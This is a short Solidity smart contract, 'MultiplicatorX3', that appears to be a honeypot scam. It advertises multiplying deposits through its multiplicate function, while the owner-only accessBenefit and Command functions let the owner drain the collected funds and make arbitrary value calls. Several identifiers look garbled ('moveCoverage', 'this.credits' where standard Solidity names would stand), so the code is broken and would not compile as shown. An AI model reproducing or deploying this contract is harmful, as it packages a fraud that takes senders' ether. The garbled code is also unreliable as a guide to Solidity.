pragma solidity ^0.4.18;

contract MultiplicatorX3
{
    address public Coordinator = msg.sender;

    function() public payable{}

    function accessBenefit()
    payable
    public
    {
        require(msg.sender == Coordinator);
        Coordinator.moveCoverage(this.credits);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Coordinator);
        adr.call.value(msg.value)(data);
    }

    function multiplicate(address adr)
    public
    payable
    {
        if(msg.value>=this.credits)
        {
            adr.moveCoverage(this.credits+msg.value);
        }
    }
}